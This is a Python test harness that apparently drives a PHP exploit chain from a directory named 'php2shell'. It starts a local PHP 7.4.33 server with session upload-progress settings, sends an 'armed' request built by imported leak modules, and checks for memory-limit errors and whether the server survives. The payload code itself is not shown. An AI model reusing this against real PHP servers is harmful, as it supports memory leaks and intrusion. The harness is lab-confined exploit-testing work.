import importlib.util, socket, subprocess, sys, time
from pathlib import Path

def load(n, p):
    s = importlib.util.spec_from_file_location(n, p)
    m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m

H = Path("/tmp/opencode/realapps/side/php2shell")
Lm = load("l", H / "native-output-leak.py")
Sm = load("s", H / "native-output-leak-stock-arm.py")
Cm = load("c", H / "compact-stock-tail.py")

L = Path("/tmp/opencode/php7lab")
BIN = str(L / "php-7.4.33/sapi/cli/php")

def rawRead(sock, deadline=40.0):
    sock.settimeout(5.0); buf = b""; t0 = time.time()
    while time.time() - t0 < deadline:
        try: chunk = sock.recv(65536)
        except socket.timeout: break
        if not chunk: break
        buf += chunk
    return buf

def arm(flen):
    b = Sm.arm_body(b"abcdefgh", flen)
    return Lm.request_bytes("127.0.0.1:28843", "/index.php", b, None, 23, True)

def case(name, flen, mem):
    st = subprocess.Popen([BIN, "-S", "127.0.0.1:28843", f"-d memory_limit={mem}",
        "-d session.upload_progress.enabled=1", "-d session.upload_progress.cleanup=0",
        f"-d session.save_path={L}/sess", "-t", str(L / "root")])
    try:
        time.sleep(1.5)
        pre = socket.create_connection(("127.0.0.1", 28843), timeout=10.0)
        pre.settimeout(10.0)
        pre.sendall(b"GET /index.php HTTP/1.1\r\nHost: 127.0.0.1:28843\r\nConnection: close\r\n\r\n")
        praw = rawRead(pre, 10.0); pre.close()
        req = arm(flen)
        out = []
        for i in (1, 2, 3):
            try:
                c = socket.create_connection(("127.0.0.1", 28843), timeout=45.0); c.settimeout(45.0)
                c.sendall(req); raw = rawRead(c); c.close()
                out.append((i, raw.split(b"\r\n",1)[0][:30].decode(errors="replace"), len(raw), b"Allowed memory" in raw))
            except Exception as e:
                out.append((i, "ERR", 0, str(e)[:60]))
        post = "-"
        try:
            pc = socket.create_connection(("127.0.0.1", 28843), timeout=10.0); pc.settimeout(10.0)
            pc.sendall(b"GET /index.php HTTP/1.1\r\nHost: 127.0.0.1:28843\r\nConnection: close\r\n\r\n")
            post = rawRead(pc, 10.0).split(b"\r\n", 1)[0][:25].decode(errors="replace") or "EMPTY"
            pc.close()
        except Exception as e:
            post = "CONNFAIL"
        lines = [f"[{name}] flen={flen} mem={mem} pre={praw.split(b'\\r\\n',1)[0][:25].decode(errors='replace')}",
                 *[f"  R{i}: {s} len={n} oom={o}" for (i, s, n, o) in out],
                 f"  post={post}"]
        print("\n".join(lines))
    finally:
        st.terminate(); st.wait(); time.sleep(0.5)

case("fl128-mem8M", 128, "8M")
case("fl262144-mem64M", 262144, "64M")
case("fl262144-mem8M", 262144, "8M")
case("fl32768-mem8M", 32768, "8M")
